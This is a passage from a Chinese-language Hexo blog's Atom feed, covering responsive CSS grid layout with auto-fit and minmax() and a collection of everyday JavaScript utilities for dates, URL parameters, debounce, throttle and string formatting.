    <id>https://hisai3.github.io/hisai3.github.io/2023/01/14/Css%E5%93%8D%E5%BA%94%E5%BC%8F%E5%B8%83%E5%B1%80grid/</id>
    <published>2023-01-14T06:31:31.000Z</published>
    <updated>2023-01-15T06:38:36.858Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/69809343">一行css代码搞定响应式布局</a><br><a href="https://juejin.cn/post/6854573220306255880">掘金</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>5<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>6<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">      <span class="attribute">display</span>: grid;</span><br><span class="line">      <span class="attribute">grid-gap</span>: <span class="number">5px</span>;</span><br><span class="line">      <span class="comment">/* 三列固定100px宽度 */</span></span><br><span class="line">      <span class="comment">/* grid-template-columns: 100px 100px 100px; */</span></span><br><span class="line">      <span class="comment">/* 三列自适应撑满 */</span></span><br><span class="line">      <span class="comment">/* grid-template-columns: 1fr 1fr 1fr; */</span></span><br><span class="line">      <span class="comment">/* 三列固定100px宽度 */</span></span><br><span class="line">      <span class="comment">/* grid-template-columns: repeat(3, 100px); */</span></span><br><span class="line">      <span class="comment">/* auto-fit自适应数量的列固定100px宽度 */</span></span><br><span class="line">      <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(auto-fit, <span class="number">100px</span>);</span><br><span class="line">      <span class="attribute">grid-template-rows</span>: <span class="number">50px</span> <span class="number">50px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.container</span> <span class="selector-tag">div</span> &#123;</span><br><span class="line">      <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>以上可以做到flex的基础布局</p></blockquote><blockquote><p>现在，栅格将会根据容器的宽度调整其数量。它会尝试在容器中容纳尽可能多的 100px 宽的列。但如果我们将所有列硬写为 100px，我们将永远没法获得所需的弹性，因为它们很难填充整个宽度。网格通常在右侧留有空白。</p></blockquote><p><strong>minmax()</strong></p><blockquote><p>我们需要minmax()。我们将 100px 替换为 minmax(100px, 1fr)，代码如下：</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">grid-gap</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(auto-fit, <span class="built_in">minmax</span>(<span class="number">100px</span>, <span class="number">1</span>fr));</span><br><span class="line">    <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">2</span>, <span class="number">100px</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 最终达到一个默认撑满, 当页面缩小, 元素会宽度会压缩, 最小为100px, 之后换行 */</span></span><br></pre></td></tr></table></figure><blockquote><p><code>minmax()</code>函数定义的范围大于或等于 min， 小于或等于 max。</p></blockquote><p><strong>注意:</strong> 跟<code>flex</code> + <code>minwidth</code> 的区别在于，换行后，换行的元素会<strong>撑满</strong>, 而 <code>grid</code> 的会以<strong>最小宽度</strong>存在</p>]]></content>
    
    
    <summary type="html">Css响应式布局grid</summary>
    
    
    
    <category term="css" scheme="https://hisai3.github.io/hisai3.github.io/categories/css/"/>
    
    
    <category term="css" scheme="https://hisai3.github.io/hisai3.github.io/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>JS 常用工具</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/01/14/JS%20%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/01/14/JS%20%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</id>
    <published>2023-01-14T06:31:31.000Z</published>
    <updated>2023-01-15T06:50:47.414Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JS-常用工具"><a href="#JS-常用工具" class="headerlink" title="JS 常用工具"></a>JS 常用工具</h1><p><a href="https://juejin.cn/post/6844904090313424903">一坨校验</a></p><h3 id="时间处理"><a href="#时间处理" class="headerlink" title="时间处理"></a>时间处理</h3><h5 id="格式化时间"><a href="#格式化时间" class="headerlink" title="格式化时间"></a>格式化时间</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">formatDate</span>(<span class="params">date, fmt</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="regexp">/(y+)/</span>.<span class="title function_">test</span>(fmt)) &#123;</span><br><span class="line">    fmt = fmt.<span class="title function_">replace</span>(</span><br><span class="line">      <span class="title class_">RegExp</span>.<span class="property">$1</span>,</span><br><span class="line">      (date.<span class="title function_">getFullYear</span>() + <span class="string">&#x27;&#x27;</span>).<span class="title function_">substr</span>(<span class="number">4</span> - <span class="title class_">RegExp</span>.<span class="property">$1</span>.<span class="property">length</span>)</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> o = &#123;</span><br><span class="line">    <span class="string">&#x27;M+&#x27;</span>: date.<span class="title function_">getMonth</span>() + <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;d+&#x27;</span>: date.<span class="title function_">getDate</span>(),</span><br><span class="line">    <span class="string">&#x27;h+&#x27;</span>: date.<span class="title function_">getHours</span>(),</span><br><span class="line">    <span class="string">&#x27;m+&#x27;</span>: date.<span class="title function_">getMinutes</span>(),</span><br><span class="line">    <span class="string">&#x27;s+&#x27;</span>: date.<span class="title function_">getSeconds</span>(),</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> k <span class="keyword">in</span> o) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">`(<span class="subst">$&#123;k&#125;</span>)`</span>).<span class="title function_">test</span>(fmt)) &#123;</span><br><span class="line">      <span class="keyword">let</span> str = o[k] + <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      fmt = fmt.<span class="title function_">replace</span>(</span><br><span class="line">        <span class="title class_">RegExp</span>.<span class="property">$1</span>,</span><br><span class="line">        <span class="title class_">RegExp</span>.<span class="property">$1</span>.<span class="property">length</span> === <span class="number">1</span> ? str : (<span class="string">&#x27;00&#x27;</span> + str).<span class="title function_">substr</span>(str.<span class="property">length</span>)</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fmt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">formatDate</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(), <span class="string">&#x27;yyyy-MM-dd hh:mm:ss&#x27;</span>);</span><br><span class="line"><span class="title function_">formatDate</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(), <span class="string">&#x27;yyyy-MM-dd&#x27;</span>);</span><br><span class="line"><span class="title function_">formatDate</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(), <span class="string">&#x27;hh:mm:ss&#x27;</span>);</span><br></pre></td></tr></table></figure><h5 id="获取前x天的日期"><a href="#获取前x天的日期" class="headerlink" title="获取前x天的日期"></a>获取前x天的日期</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getDateBeforeNow</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>()</span><br><span class="line"><span class="keyword">const</span> day = now.<span class="title function_">getDate</span>()</span><br><span class="line">    <span class="keyword">return</span> now.<span class="title function_">setDate</span>(day - val)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="获取当年指定月最后一日"><a href="#获取当年指定月最后一日" class="headerlink" title="获取当年指定月最后一日"></a>获取当年指定月最后一日</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如若获取第一天 new Date(year, m - 1, 1)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getLastDate</span>(<span class="params">m</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> year = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getFullYear</span>()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(year, m, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="获取本周的开始、结束日期-（周一到周日）"><a href="#获取本周的开始、结束日期-（周一到周日）" class="headerlink" title="获取本周的开始、结束日期 （周一到周日）"></a>获取本周的开始、结束日期 （周一到周日）</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getWeekStartAndEnd</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>()</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">start</span>: <span class="keyword">new</span> <span class="title class_">Date</span>(now.<span class="title function_">setDate</span>(now.<span class="title function_">getDate</span>() - now.<span class="title function_">getDay</span>() + <span class="number">1</span>)),</span><br><span class="line">        <span class="attr">end</span>: <span class="keyword">new</span> <span class="title class_">Date</span>(now.<span class="title function_">setDate</span>(now.<span class="title function_">getDate</span>() - now.<span class="title function_">getDay</span>() + <span class="number">7</span>))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h5 id="操作URL查询参数"><a href="#操作URL查询参数" class="headerlink" title="操作URL查询参数"></a>操作URL查询参数</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(location.<span class="property">search</span>.<span class="title function_">replace</span>(<span class="regexp">/\?/ig</span>, <span class="string">&quot;&quot;</span>)); </span><br><span class="line"><span class="comment">// location.search = &quot;?name=young&amp;sex=male&quot;</span></span><br><span class="line">params.<span class="title function_">has</span>(<span class="string">&quot;young&quot;</span>); <span class="comment">// true</span></span><br><span class="line">params.<span class="title function_">get</span>(<span class="string">&quot;sex&quot;</span>); <span class="comment">// &quot;male&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryString</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;(^|&amp;)&#x27;</span> + name + <span class="string">&#x27;=([^&amp;]*)(&amp;|$)&#x27;</span>, <span class="string">&#x27;i&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> r = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substr</span>(<span class="number">1</span>).<span class="title function_">match</span>(reg);</span><br><span class="line">  <span class="keyword">if</span> (r != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">unescape</span>(r[<span class="number">2</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="序列化参数"><a href="#序列化参数" class="headerlink" title="序列化参数"></a>序列化参数</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * object转化成url拼接样式</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj 需要转化的参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">objToUrl</span> = obj =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> obj)&#123;</span><br><span class="line">        <span class="keyword">if</span> (obj.<span class="title function_">hasOwnProperty</span>(i)) &#123;</span><br><span class="line">            arr.<span class="title function_">push</span>(<span class="built_in">encodeURIComponent</span>(i) + <span class="string">&quot;=&quot;</span> + <span class="built_in">encodeURIComponent</span>(obj[i]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr.<span class="title function_">join</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line"><span class="title function_">objToUrl</span>(&#123;<span class="attr">name</span>:<span class="string">&#x27;hehe&#x27;</span>,<span class="attr">age</span>:<span class="number">10</span>&#125;)</span><br></pre></td></tr></table></figure><h5 id="反序列化参数"><a href="#反序列化参数" class="headerlink" title="反序列化参数"></a>反序列化参数</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * url转化成object拼接样式</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> url 需要转化的参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">urlToObj</span> = url =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> string = url.<span class="title function_">split</span>(<span class="string">&#x27;&amp;&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> res = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;string.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> str = string[i].<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(str[<span class="number">0</span>]!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            res[str[<span class="number">0</span>]]=str[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line"><span class="comment">// 无法处理链接 只能先接触参数部分</span></span><br><span class="line"><span class="title function_">urlToObj</span>(<span class="string">&quot;a=1&amp;b=2&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> url = <span class="string">&quot;http://www.baidu.com?name=elephant&amp;age=25&amp;sex=male&amp;num=100&quot;</span></span><br><span class="line"><span class="comment">// 返回参数对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">queryURLParams</span>(<span class="params">url</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> pattern = <span class="regexp">/(\w+)=(\w+)/ig</span>; <span class="comment">//定义正则表达式</span></span><br><span class="line"><span class="keyword">let</span> parames = &#123;&#125;; <span class="comment">// 定义参数对象</span></span><br><span class="line">url.<span class="title function_">replace</span>(pattern, <span class="function">(<span class="params">$, $<span class="number">1</span>, $<span class="number">2</span></span>) =&gt;</span> &#123;</span><br><span class="line">  parames[$<span class="number">1</span>] = $<span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">return</span> parames;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以获取链接上所有的参数  包括hash 不会存在返回 &#123;&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">queryURLParams</span>(url))</span><br></pre></td></tr></table></figure><h5 id="防抖"><a href="#防抖" class="headerlink" title="防抖"></a>防抖</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>(<span class="params">func, wait, immediate</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> timeout, result;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> context = <span class="variable language_">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="variable language_">arguments</span>;</span><br><span class="line">        <span class="keyword">if</span> (timeout) <span class="built_in">clearTimeout</span>(timeout);</span><br><span class="line">        <span class="keyword">if</span> (immediate) &#123;</span><br><span class="line">            <span class="keyword">var</span> callNow = !timeout;</span><br><span class="line">            timeout = <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                timeout = <span class="literal">null</span></span><br><span class="line">            &#125;, wait);</span><br><span class="line">            <span class="keyword">if</span> (callNow) result = func.<span class="title function_">apply</span>(context, args);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            timeout = <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                func.<span class="title function_">apply</span>(context, args);</span><br><span class="line">            &#125;, wait);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="节流"><a href="#节流" class="headerlink" title="节流"></a>节流</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">throttle</span>(<span class="params">func,wait</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> context, args, timeout;</span><br><span class="line">    <span class="keyword">var</span> tag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        context = <span class="variable language_">this</span>;</span><br><span class="line">        args = <span class="variable language_">arguments</span>;</span><br><span class="line">        <span class="keyword">if</span>(!timeout)&#123;</span><br><span class="line">            timeout = <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                timeout = <span class="literal">null</span>;</span><br><span class="line">                func.<span class="title function_">apply</span>(context, args);</span><br><span class="line">            &#125;, wait)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 首次会执行</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">throttle2</span>(<span class="params">fn,delay=<span class="number">100</span></span>)&#123;</span><br><span class="line"><span class="keyword">let</span> last = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">let</span> curr = +<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="keyword">if</span>(curr - last &gt; delay)&#123;</span><br><span class="line">fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">last = curr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="格式化金钱"><a href="#格式化金钱" class="headerlink" title="格式化金钱"></a>格式化金钱</h5><ol><li>正则</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">ThousandNum</span> = num =&gt; num.<span class="title function_">toString</span>().<span class="title function_">replace</span>(<span class="regexp">/\B(?=(\d&#123;3&#125;)+(?!\d))/g</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> money = <span class="title class_">ThousandNum</span>(<span class="number">20190214</span>);</span><br><span class="line"><span class="comment">// money =&gt; &quot;20,190,214&quot;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>web API<br><code>toLocaleString</code> 返回这个数字在特定语言环境下的字符串表示</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">12345</span>;</span><br><span class="line">num.<span class="title function_">toLocaleString</span>(); <span class="comment">// &quot;12,345&quot;，注意有个千分位逗号</span></span><br><span class="line">num.<span class="title function_">toString</span>();       <span class="comment">// &quot;12345&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用locales参数 缩写的语言代码或这些代码组成的数组</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">1234567890</span>;</span><br><span class="line">num.<span class="title function_">toLocaleString</span>(<span class="string">&#x27;zh-Hans-CN-u-nu-hanidec&#x27;</span>); <span class="comment">// &quot;一,二三四,五六七,八九〇&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用options参数 指定了一些附加的样式属性</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">123456.789</span>;</span><br><span class="line">num.<span class="title function_">toLocaleString</span>(<span class="string">&#x27;de-DE&#x27;</span>, &#123; <span class="attr">style</span>: <span class="string">&#x27;currency&#x27;</span>, <span class="attr">currency</span>: <span class="string">&#x27;EUR&#x27;</span> &#125;); <span class="comment">// &quot;123.456,79 €&quot;</span></span><br></pre></td></tr></table></figure><h5 id="格式化电话号码"><a href="#格式化电话号码" class="headerlink" title="格式化电话号码"></a>格式化电话号码</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> mobile = <span class="string">&#x27;18379836654&#x27;</span> </span><br><span class="line"><span class="keyword">let</span> mobileReg = <span class="regexp">/(?=(\d&#123;4&#125;)+$)/g</span> </span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(mobile.<span class="title function_">replace</span>(mobileReg, <span class="string">&#x27;-&#x27;</span>)) <span class="comment">// 183-7983-6654</span></span><br></pre></td></tr></table></figure><h5 id="去除前后空格"><a href="#去除前后空格" class="headerlink" title="去除前后空格"></a>去除前后空格</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">trim1</span> = (<span class="params">str</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> str.<span class="title function_">replace</span>(<span class="regexp">/^\s*|\s*$/g</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment">// 或者 str.replace(/^\s*(.*?)\s*$/g, &#x27;$1&#x27;)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> string = <span class="string">&#x27;   hello medium   &#x27;</span></span><br><span class="line"><span class="keyword">const</span> noSpaceString = <span class="string">&#x27;hello medium&#x27;</span></span><br><span class="line"><span class="keyword">const</span> trimString = <span class="title function_">trim1</span>(string)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(string)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(trimString, trimString === noSpaceString) <span class="comment">// hello medium true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(string)</span><br></pre></td></tr></table></figure><h5 id="生成随机ID"><a href="#生成随机ID" class="headerlink" title="生成随机ID"></a>生成随机ID</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">RandomId</span> = len =&gt; <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">36</span>).<span class="title function_">substr</span>(<span class="number">3</span>, len);</span><br><span class="line"><span class="keyword">const</span> id = <span class="title class_">RandomId</span>(<span 